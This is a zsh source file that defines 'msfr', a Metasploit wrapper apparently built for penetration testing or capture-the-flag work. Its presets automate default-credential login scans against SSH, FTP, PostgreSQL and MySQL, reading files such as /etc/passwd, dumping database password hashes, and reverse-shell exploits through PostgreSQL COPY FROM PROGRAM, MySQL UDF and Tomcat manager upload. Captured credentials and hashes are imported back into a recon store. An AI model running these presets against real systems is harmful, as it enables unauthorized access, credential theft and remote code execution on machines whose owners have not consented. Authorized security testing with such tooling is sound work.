# ========================
# Metasploit presets (msfr)
# ========================

_msfr-py() {
  python3 -c "
import os, sys
sys.path.insert(0, os.path.dirname(os.environ['RECON_APP']))
$1
" "${@:2}"
}

_msfr-module-family() {
  _msfr-py "import msf_run; print(msf_run.module_family(sys.argv[1]))" "$1" 2>/dev/null
}

_msfr-resolve-rport() {
  local ip="$1" module="$2" explicit="${3:-}"
  local -a args=(msf-port "$ip" "$module")
  [[ -n "$explicit" ]] && args+=(-p "$explicit")
  python3 "$RECON_APP" "${args[@]}" 2>/dev/null
}

_msfr-cred-keys() {
  _msfr-py "import msf_run; u,p=msf_run.cred_option_names(sys.argv[1]); print(u, p)" "$1" 2>/dev/null
}

_msfr-default-ssl() {
  local rport="$1" module="$2"
  [[ -z "$rport" ]] && return 1
  _msfr-py "import msf_run; print('true' if msf_run.default_ssl(int(sys.argv[1]), sys.argv[2]) else '')" "$rport" "$module" 2>/dev/null | grep -q true
}

_msfr-usage() {
  cat <<'EOF'
usage: msfr <preset> [options]
       msfr -m <module> [options]
       msfr list

Run Metasploit with case defaults: RHOSTS=$IP, RPORT from scout/env, LHOST=lhost (exploits).

login presets (quick check — MSF defaults or seclists betterdefaultpasslist; wordlist → hydrassh / hydraftp):
  pg-login       postgres (MSF built-in defaults) → cl
  my-login       mysql (MSF root + blank) → cl
  ssh-login      SSH (seclists ssh-betterdefaultpasslist) → cl
  ftp-login      FTP (seclists ftp-betterdefaultpasslist) → cl

presets (postgres):
  pg-login       postgres quick login → saves hits to cl
  pg-sql         SQL query (-s, default SELECT version();)
  pg-readfile    read file (-f)
  pg-hashdump    dump DB password hashes
  pg-shell       COPY FROM PROGRAM revshell

presets (mysql):
  my-login       mysql quick login → saves hits to cl
  my-sql         SQL query (-s, default SELECT version())
  my-hashdump    dump DB password hashes
  my-shell       UDF payload revshell

presets (other):
  tomcat-mgr     tomcat_mgr_upload (Http creds; -U /manager)

options:
  -m, --module PATH   custom module (instead of preset)
  -i, --rhost IP      target (default: $IP)
  -p, --port PORT     RPORT (else scout → env → family default)
  -u, --user USER     cred username (MSF name depends on module family)
  -w, --pass PASS     cred password
  -U, --uri PATH      TARGETURI (http; default / for tomcat-mgr)
  -f, --file PATH     RFILE (pg-readfile)
  -s, --sql QUERY     SQL (pg-sql)
  -l, --lhost IP      LHOST (exploits)
  -P, --lport PORT    LPORT (default 4444)
  -o, --opt KEY=VAL   extra set (repeatable)
  --ssl               set SSL true
  --creds             apply -u/cl creds for -m (off by default for unknown modules)
  -n, --dry-run       print msfconsole command + resource script; do not run
  --batch             exit msf after run (default: aux)
  --stay              keep msf open (default: exploits)

env: MSFR_PORT, DB_PORT, MYSQL_PORT, SSH_PORT, FTP_PORT, HTTP_PORT, SMB_PORT
      MSFR_QUICK_USERPASS / MSFR_SSH_USERPASS / MSFR_FTP_USERPASS (seclists betterdefaultpasslist)

examples:
  msfr pg-login                  # quick: blank / user-as-pass (not rockyou)
  msfr pg-sql -n
  msfr pg-sql darkstart          # cl のユーザを指定（-u でも可）
  msfr pg-readfile -u poster -f /etc/passwd
  msfr my-login
  msfr my-sql -u root
  msfr ssh-login                 # quick; wordlist → hydrassh
  msfr ssh-login -u root -w toor # single cred try
  msfr ftp-login
  msfr tomcat-mgr -u bob -w bubbles -p 1234
  msfr -m exploit/multi/http/tomcat_mgr_upload -u bob -w bubbles -o TARGETURI=/manager --stay
EOF
}

_msfr-list() {
  cat <<'EOF'
preset       family    module
pg-login     postgres  auxiliary/scanner/postgres/postgres_login
pg-sql       postgres  auxiliary/admin/postgres/postgres_sql
pg-readfile  postgres  auxiliary/admin/postgres/postgres_readfile
pg-hashdump  postgres  auxiliary/scanner/postgres/postgres_hashdump
pg-shell     postgres  exploit/multi/postgres/postgres_copy_from_program_cmd_exec
my-login     mysql     auxiliary/scanner/mysql/mysql_login
my-sql       mysql     auxiliary/admin/mysql/mysql_sql
my-hashdump  mysql     auxiliary/scanner/mysql/mysql_hashdump
my-shell     mysql     exploit/multi/mysql/mysql_udf_payload
ssh-login    ssh       auxiliary/scanner/ssh/ssh_login
ftp-login    ftp       auxiliary/scanner/ftp/ftp_login
tomcat-mgr   http      exploit/multi/http/tomcat_mgr_upload
EOF
}

# Sets _MSFR_MODULE _MSFR_KIND _MSFR_DEFAULT_USER _MSFR_NEEDS_CREDS _MSFR_DEFAULT_URI
_msfr-resolve-preset() {
  local preset="${1:-}"
  _MSFR_MODULE=""
  _MSFR_KIND="aux"
  _MSFR_DEFAULT_USER=""
  _MSFR_NEEDS_CREDS=0
  _MSFR_DEFAULT_URI=""

  case "$preset" in
    pg-login|postgres-login)
      _MSFR_MODULE="auxiliary/scanner/postgres/postgres_login"
      ;;
    pg-sql|postgres-sql)
      _MSFR_MODULE="auxiliary/admin/postgres/postgres_sql"
      _MSFR_DEFAULT_USER="postgres"
      _MSFR_NEEDS_CREDS=1
      ;;
    pg-readfile|postgres-readfile)
      _MSFR_MODULE="auxiliary/admin/postgres/postgres_readfile"
      _MSFR_DEFAULT_USER="postgres"
      _MSFR_NEEDS_CREDS=1
      ;;
    pg-hashdump|postgres-hashdump)
      _MSFR_MODULE="auxiliary/scanner/postgres/postgres_hashdump"
      _MSFR_DEFAULT_USER="postgres"
      _MSFR_NEEDS_CREDS=1
      ;;
    pg-shell|postgres-shell|pg-rce|postgres-rce)
      _MSFR_MODULE="exploit/multi/postgres/postgres_copy_from_program_cmd_exec"
      _MSFR_KIND="exploit"
      _MSFR_DEFAULT_USER="postgres"
      _MSFR_NEEDS_CREDS=1
      ;;
    my-login|mysql-login)
      _MSFR_MODULE="auxiliary/scanner/mysql/mysql_login"
      ;;
    my-sql|mysql-sql)
      _MSFR_MODULE="auxiliary/admin/mysql/mysql_sql"
      _MSFR_DEFAULT_USER="root"
      _MSFR_NEEDS_CREDS=1
      ;;
    my-hashdump|mysql-hashdump)
      _MSFR_MODULE="auxiliary/scanner/mysql/mysql_hashdump"
      _MSFR_DEFAULT_USER="root"
      _MSFR_NEEDS_CREDS=1
      ;;
    my-shell|mysql-shell|my-rce|mysql-rce)
      _MSFR_MODULE="exploit/multi/mysql/mysql_udf_payload"
      _MSFR_KIND="exploit"
      _MSFR_DEFAULT_USER="root"
      _MSFR_NEEDS_CREDS=1
      ;;
    ssh-login)
      _MSFR_MODULE="auxiliary/scanner/ssh/ssh_login"
      ;;
    ftp-login)
      _MSFR_MODULE="auxiliary/scanner/ftp/ftp_login"
      ;;
    tomcat-mgr|tomcat-upload)
      _MSFR_MODULE="exploit/multi/http/tomcat_mgr_upload"
      _MSFR_KIND="exploit"
      _MSFR_DEFAULT_URI="/manager"
      _MSFR_NEEDS_CREDS=1
      ;;
    *)
      echo "[-] msfr: unknown preset: $preset (msfr list)" >&2
      return 1
      ;;
  esac
}

_msfr-rc-set() {
  local rc="$1" key="$2" value="$3"
  [[ -z "$value" ]] && return 0
  if [[ "$value" == *' '* || "$value" == *';'* ]]; then
    value="${value//\"/\\\"}"
    print -r -- "set $key \"$value\"" >>"$rc"
  else
    print -r -- "set $key $value" >>"$rc"
  fi
}

_msfr-preset-sets() {
  local preset="$1" rc="$2" rfile="$3" sql="$4" targeturi="$5" user="${6:-}" pass="${7:-}"
  case "$preset" in
    pg-login|postgres-login)
      _msfr-rc-set "$rc" STOP_ON_SUCCESS true
      _msfr-rc-set "$rc" BLANK_PASSWORDS true
      _msfr-rc-set "$rc" USER_AS_PASS true
      ;;
    my-login|mysql-login)
      _msfr-rc-set "$rc" STOP_ON_SUCCESS true
      _msfr-rc-set "$rc" BLANK_PASSWORDS true
      _msfr-rc-set "$rc" USER_AS_PASS true
      ;;
    pg-sql|postgres-sql)
      _msfr-rc-set "$rc" SQL "${sql:-SELECT version();}"
      ;;
    my-sql|mysql-sql)
      _msfr-rc-set "$rc" SQL "${sql:-SELECT version()}"
      ;;
    pg-readfile|postgres-readfile)
      [[ -n "$rfile" ]] || {
        echo "[-] msfr: pg-readfile requires -f PATH" >&2
        return 1
      }
      _msfr-rc-set "$rc" RFILE "$rfile"
      ;;
    ssh-login)
      _msfr-rc-set "$rc" STOP_ON_SUCCESS true
      if [[ -n "$user" && -z "$pass" ]]; then
        _msfr-rc-set "$rc" BLANK_PASSWORDS true
        _msfr-rc-set "$rc" USER_AS_PASS true
      fi
      ;;
    ftp-login)
      _msfr-rc-set "$rc" STOP_ON_SUCCESS true
      if [[ -n "$user" && -z "$pass" ]]; then
        _msfr-rc-set "$rc" BLANK_PASSWORDS true
        _msfr-rc-set "$rc" USER_AS_PASS true
      fi
      ;;
    tomcat-mgr|tomcat-upload)
      _msfr-rc-set "$rc" TARGETURI "${targeturi:-/manager}"
      ;;
  esac
}

_msfr-login-preset() {
  case "$1" in
    pg-login|postgres-login|my-login|mysql-login|ssh-login|ftp-login) return 0 ;;
    *) return 1 ;;
  esac
}

_msfr-login-scan-rc() {
  local preset="$1" rc="$2" user="$3" pass="$4"
  local line key val
  local -a temps=()

  while IFS=$'\t' read -r key val; do
    [[ -n "$key" ]] || continue
    if [[ "$key" == __TEMP__ ]]; then
      temps+=("$val")
      continue
    fi
    _msfr-rc-set "$rc" "$key" "$val"
  done < <(_msfr-py "
import msf_run, sys
try:
    result = msf_run.login_scan_resource_sets(
        sys.argv[1], user=sys.argv[2] or '', password=sys.argv[3] or ''
    )
except msf_run.LoginScanConfigError as e:
    print(f'[-] msfr: {e}', file=sys.stderr)
    sys.exit(1)
for tmp in result.temp_files:
    print(f'__TEMP__\t{tmp}')
for k, v in result.sets:
    print(f'{k}\t{v}')
" "$preset" "$user" "$pass") || return 1

  (( ${#temps[@]} )) && printf '%s\n' "${temps[@]}"
  return 0
}

_msfr-creds-family() {
  case "$1" in
    pg-login|postgres-login|pg-sql|postgres-sql|pg-readfile|postgres-readfile|pg-hashdump|postgres-hashdump|pg-shell|postgres-shell|pg-rce|postgres-rce)
      echo postgres
      ;;
    my-login|mysql-login|my-sql|mysql-sql|my-hashdump|mysql-hashdump|my-shell|mysql-shell|my-rce|mysql-rce)
      echo mysql
      ;;
    ssh-login) echo ssh ;;
    ftp-login) echo ftp ;;
    tomcat-mgr|tomcat-upload) echo http ;;
    *)
      _msfr-module-family "$2"
      ;;
  esac
}

_msfr-import-login() {
  local preset="$1" ip="$2" log="$3"
  _msfr-login-preset "$preset" || return 0
  python3 "$RECON_APP" creds-import-msf "$ip" "$preset" --file "$log"
}

_msfr-hash-preset() {
  case "$1" in
    pg-hashdump|postgres-hashdump|my-hashdump|mysql-hashdump) return 0 ;;
    *) return 1 ;;
  esac
}

_msfr-import-hash() {
  local preset="$1" ip="$2" log="$3"
  _msfr-hash-preset "$preset" || return 0
  python3 "$RECON_APP" hash-import-msf "$ip" --file "$log"
}

_msfr-resolve-pass() {
  local ip="$1" user="$2" pass="$3"
  [[ -n "$pass" ]] && { echo "$pass"; return 0; }
  _recon-creds-for-user "$ip" "$user"
}

_msfr-pick-user() {
  local ip="$1" family="$2" default_user="${3:-}" dry="${4:-}" explicit="${5:-}"
  local -a args=(msfr-pick-user)
  [[ -n "$dry" ]] && args+=(--dry-run)
  [[ -n "$explicit" ]] && args+=(--user "$explicit")
  args+=("$ip" "$family")
  [[ -n "$default_user" ]] && args+=("$default_user")
  python3 "$RECON_APP" "${args[@]}"
}

_msfr-apply-creds() {
  local module="$1" ip="$2" user="$3" pass="$4" rc="$5"
  local user_key pass_key pass_src="creds-list"

  read -r user_key pass_key <<<"$(_msfr-cred-keys "$module")"
  [[ -n "$user_key" && -n "$pass_key" ]] || return 0

  if [[ -n "${pass}" ]]; then
    pass_src="inline"
  elif ! pass="$(_msfr-resolve-pass "$ip" "$user" "")"; then
    echo "[-] msfr: no password for ${user}@${ip} (ca / -w PASS)" >&2
    return 1
  fi

  echo "[*] creds: ${user}@${ip} → ${user_key} (${pass_src})" >&2
  _msfr-rc-set "$rc" "$user_key" "$user"
  _msfr-rc-set "$rc" "$pass_key" "$pass"
}

_msfr-remember-user() {
  local preset="$1" module="$2" ip="$3" user="$4"
  local family="$(_msfr-creds-family "$preset" "$module")"
  [[ -n "$family" && "$family" != generic && -n "$user" ]] || return 0
  python3 "$RECON_APP" msfr-last-set "$ip" "$family" "$user" >/dev/null 2>&1
}

msfr() {
  local preset="" module="" rhost="" lhost="" lport="4444" rport=""
  local user="" pass="" rfile="" sql="" targeturi="" ssl=""
  local batch="" stay="" want_creds="" dry_run=""
  local -a extra_opts=()
  local needs_creds=0 default_user="" default_uri="" kind="aux"

  (( $+functions[target-load] )) && [[ -z "${IP:-}" ]] && target-load 2>/dev/null

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -h|--help) _msfr-usage; return 0 ;;
      list) _msfr-list; return 0 ;;
      -m|--module) module="$2"; shift 2 ;;
      -o|--opt) extra_opts+=("$2"); shift 2 ;;
      -p|--port) rport="$2"; shift 2 ;;
      -u|--user) user="$2"; shift 2 ;;
      -w|--pass) pass="$2"; shift 2 ;;
      -f|--file) rfile="$2"; shift 2 ;;
      -s|--sql) sql="$2"; shift 2 ;;
      -U|--uri) targeturi="$2"; shift 2 ;;
      -P|--lport) lport="$2"; shift 2 ;;
      -i|--rhost) rhost="$2"; shift 2 ;;
      -l|--lhost) lhost="$2"; shift 2 ;;
      --ssl) ssl=1; shift ;;
      --creds) want_creds=1; shift ;;
      -n|--dry-run) dry_run=1; shift ;;
      --batch) batch=1; shift ;;
      --stay) stay=1; shift ;;
      -*)
        echo "[-] msfr: unknown option: $1" >&2
        _msfr-usage >&2
        return 1
        ;;
      *)
        if [[ -z "$preset" ]]; then
          preset="$1"
        elif [[ -z "$user" ]]; then
          user="$1"
        else
          echo "[-] msfr: unexpected argument: $1" >&2
          return 1
        fi
        shift
        ;;
    esac
  done

  [[ -n "$preset" || -n "$module" ]] || { _msfr-usage >&2; return 1; }

  if [[ -n "$preset" ]]; then
    _msfr-resolve-preset "$preset" || return 1
    module="$_MSFR_MODULE"
    kind="$_MSFR_KIND"
    needs_creds="$_MSFR_NEEDS_CREDS"
    default_user="$_MSFR_DEFAULT_USER"
    default_uri="$_MSFR_DEFAULT_URI"
  elif [[ "$module" == exploit/* ]]; then
    kind="exploit"
  fi

  rhost="${rhost:-$(_recon-ip-default 2>/dev/null)}"
  [[ -n "$rhost" ]] || {
    echo "[-] msfr: no target (target-set <ip> or -i IP)" >&2
    return 1
  }

  local resolved_rport=""
  resolved_rport="$(_msfr-resolve-rport "$rhost" "$module" "$rport")"
  if [[ -n "$resolved_rport" ]]; then
    rport="$resolved_rport"
  elif [[ -n "$rport" ]]; then
  else
    echo "[*] msfr: RPORT unset (family unknown; use -p or scout scan)" >&2
  fi

  local rc log msf_exit=0
  local -a userpass_temps=()
  rc="$(mktemp "${TMPDIR:-/tmp}/msfr.XXXXXX.rc")"
  log="$(mktemp "${TMPDIR:-/tmp}/msfr.XXXXXX.log")"
  trap 'rm -f "$rc" "$log" "${userpass_temps[@]}"' EXIT INT TERM

  print -r -- "use $module" >"$rc"
  _msfr-rc-set "$rc" RHOSTS "$rhost"
  [[ -n "$rport" ]] && _msfr-rc-set "$rc" RPORT "$rport"

  if [[ -n "$preset" ]]; then
    _msfr-preset-sets "$preset" "$rc" "$rfile" "$sql" "${targeturi:-$default_uri}" "$user" "$pass" || return 1
  elif [[ -n "$targeturi" ]]; then
    _msfr-rc-set "$rc" TARGETURI "$targeturi"
  fi

  if _msfr-login-preset "$preset"; then
    case "$preset" in
      ssh-login|ftp-login)
        userpass_temps=("${(@f)$(_msfr-login-scan-rc "$preset" "$rc" "$user" "$pass")}") || return 1
        ;;
    esac
  fi

  local apply_creds=0
  if (( needs_creds )) || [[ -n "$want_creds" ]] || [[ -n "$user" || -n "$pass" ]]; then
    apply_creds=1
  fi

  if (( apply_creds )); then
    local creds_family="$(_msfr-creds-family "$preset" "$module")"
    if [[ -n "$creds_family" && "$creds_family" != generic ]]; then
      if [[ "$creds_family" == http ]]; then
        user="${user:-$default_user}"
        [[ -n "$user" ]] || user="$(_recon-pick-user "$rhost" 1 2>/dev/null)" || {
          echo "[-] msfr: need -u USER or creds in cl" >&2
          return 1
        }
      else
        user="$(_msfr-pick-user "$rhost" "$creds_family" "$default_user" "$dry_run" "$user")" || return 1
      fi
    else
      user="${user:-$default_user}"
      if [[ -z "$user" ]]; then
        user="$(_recon-pick-user "$rhost" 1 2>/dev/null)" || {
          echo "[-] msfr: need -u USER or creds in cl" >&2
          return 1
        }
      fi
    fi
    _msfr-apply-creds "$module" "$rhost" "$user" "$pass" "$rc" || return 1
    [[ -z "$dry_run" ]] && _msfr-remember-user "$preset" "$module" "$rhost" "$user"
  fi

  if [[ "$kind" == exploit || "$module" == exploit/* ]]; then
    lhost="${lhost:-$(_revshell-lhost 2>/dev/null)}"
    [[ -n "$lhost" ]] || {
      echo "[-] msfr: LHOST not found (tun0/eth0 or -l IP)" >&2
      return 1
    }
    _msfr-rc-set "$rc" LHOST "$lhost"
    _msfr-rc-set "$rc" LPORT "$lport"
  fi

  if [[ -n "$ssl" ]] || _msfr-default-ssl "$rport" "$module"; then
    _msfr-rc-set "$rc" SSL true
  fi

  local opt key val
  for opt in "${extra_opts[@]}"; do
    [[ "$opt" == *=* ]] || {
      echo "[-] msfr: -o expects KEY=VAL, got: $opt" >&2
      return 1
    }
    key="${opt%%=*}"
    val="${opt#*=}"
    _msfr-rc-set "$rc" "$key" "$val"
  done

  print -r -- "run" >>"$rc"

  local do_exit=0
  if [[ -n "$batch" ]]; then
    do_exit=1
  elif [[ -n "$stay" ]]; then
    do_exit=0
  elif [[ "$kind" == aux ]]; then
    do_exit=1
  fi
  (( do_exit )) && print -r -- "exit -y" >>"$rc"

  if [[ -n "$dry_run" ]]; then
    echo "# msfr dry-run: ${preset:-custom} → $module"
    echo "# RHOSTS=$rhost${rport:+ RPORT=$rport}${lhost:+ LHOST=$lhost LPORT=$lport}"
    echo "msfconsole -q -r $rc"
    echo "--- resource ($rc) ---"
    cat "$rc"
    if _msfr-login-preset "$preset"; then
      echo "---"
      echo "# post-run: creds-import-msf $rhost $preset --file <log>"
    fi
    if _msfr-hash-preset "$preset"; then
      echo "# post-run: hash-import-msf $rhost --file <log>"
    fi
    [[ "$kind" == exploit && ! $do_exit -eq 1 ]] && echo "# tip: sessions -l / sessions -i 1"
    return 0
  fi

  echo "[*] msfr: ${preset:-custom} → $module" >&2
  echo "[*] RHOSTS=$rhost${rport:+ RPORT=$rport}${lhost:+ LHOST=$lhost LPORT=$lport}" >&2
  [[ "$kind" == exploit && ! $do_exit -eq 1 ]] && echo "[*] tip: sessions -l / sessions -i 1" >&2

  msfconsole -q -r "$rc" 2>&1 | tee "$log"
  msf_exit=${pipestatus[1]}

  _msfr-import-login "$preset" "$rhost" "$log"
  _msfr-import-hash "$preset" "$rhost" "$log"

  return $msf_exit
}

_msfr() {
  local curcontext="$curcontext" state line
  typeset -A opt_args

  local -a presets
  presets=(
    'pg-login:PostgreSQL login scan'
    'pg-sql:SQL query'
    'pg-readfile:Read file (-f)'
    'pg-hashdump:Password hash dump'
    'pg-shell:COPY FROM PROGRAM shell'
    'my-login:MySQL login scan'
    'my-sql:SQL query'
    'my-hashdump:Password hash dump'
    'my-shell:UDF payload shell'
    'ssh-login:SSH quick login (blank/user-as-pass)'
    'ftp-login:FTP quick login (anonymous etc.)'
    'tomcat-mgr:Tomcat manager upload'
    'list:List presets'
  )

  _arguments -C -S \
    '(-m)--module[MSF module]:module:' \
    '-i[RHOST]:ip:' \
    '-p[RPORT]:port:' \
    '-u[username]:user:' \
    '-w[password]:pass:' \
    '-U[TARGETURI]:uri:' \
    '-f[RFILE]:file:_files' \
    '-s[SQL]:query:' \
    '-l[LHOST]:ip:' \
    '-P[LPORT]:port:(4444 5555)' \
    '-o[option]:KEY=VAL:' \
    '--ssl[set SSL true]' \
    '--creds[apply creds for -m]' \
    '(-n)--dry-run[print command + resource only]' \
    '--batch[exit after run]' \
    '--stay[keep msf open]' \
    '1: :->preset'

  case $state in
    preset)
      _describe -t presets 'msfr preset' presets
      ;;
  esac
}

compdef _msfr msfr
